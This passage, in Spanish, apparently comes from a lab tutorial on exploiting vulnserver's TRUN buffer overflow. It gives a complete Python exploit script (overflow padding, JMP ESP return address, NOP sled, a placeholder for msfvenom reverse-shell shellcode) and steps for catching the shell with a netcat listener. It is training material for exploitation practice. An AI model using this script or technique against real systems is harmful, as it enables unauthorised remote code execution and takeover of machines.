**Explicación:** "Genero el shellcode de reverse shell apuntando a mi Kali en el 4444. Excluyo el bad char \x00."

## Exploit final (exploit.py)

Crea el script:

```bash
nano exploit.py
```

Pega lo siguiente (reemplaza la línea del `buf` con las líneas de TU msfvenom y la dirección `retn` con TU dirección de JMP ESP en little-endian). Guarda con Ctrl+O, Enter, Ctrl+X, y verifica con `cat exploit.py` antes de lanzar:

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
overflow = b"A" * 2003
retn = b"\xaf\x11\x50\x62"   # 625011af little-endian
padding = b"\x90" * 16
buf = b""
buf += b"PEGA_EL_BUF_DE_MSFVENOM"
buffer = prefix + overflow + retn + padding + buf
s = socket.socket()
s.connect((ip, port))
s.send(buffer)
s.close()
```

⚠️ El shellcode cambia cada vez que corres msfvenom: pega el buf nuevo.

## Golpe final — EN ESTE ORDEN

1. **Cierra Immunity. Deja solo vulnserver.exe abierto.** Si Immunity está en Paused, la shell no sale.
2. En Kali, primero el listener:

```bash
nc -nvlp 4444
```

3. Después, en otra terminal: `python3 exploit.py`
4. En netcat escribe `whoami` `ipconfig` → shell de Windows. ✅

⚠️ **Si netcat se queda mudo:** el handler de Armitage sigue en el 4444. Mátalo (`sudo pkill -f msfrpcd`, cierra Armitage) o usa 4445 en msfvenom **y** en nc (el mismo número en los dos).

---
